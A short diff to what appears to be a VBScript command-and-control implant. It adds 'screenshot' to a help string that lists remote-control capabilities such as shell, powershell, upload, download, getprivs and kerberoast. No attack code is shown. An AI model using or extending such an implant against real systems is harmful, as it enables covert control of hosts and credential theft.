@@ -282,7 +282,7 @@ End Function
 
 Function CmdHelp(taskParams)
     CmdHelp = "Available commands: help, exit, pwd, ls, mkdir, mv, cat, upload, download, " & _
-              "ps, kill, jobs, jobkill, env, getprivs, process_spawn, shell, powershell, kerberoast"
+              "ps, kill, jobs, jobkill, env, getprivs, process_spawn, shell, powershell, screenshot, kerberoast"
 End Function
 
 Function CmdPwd(taskParams)
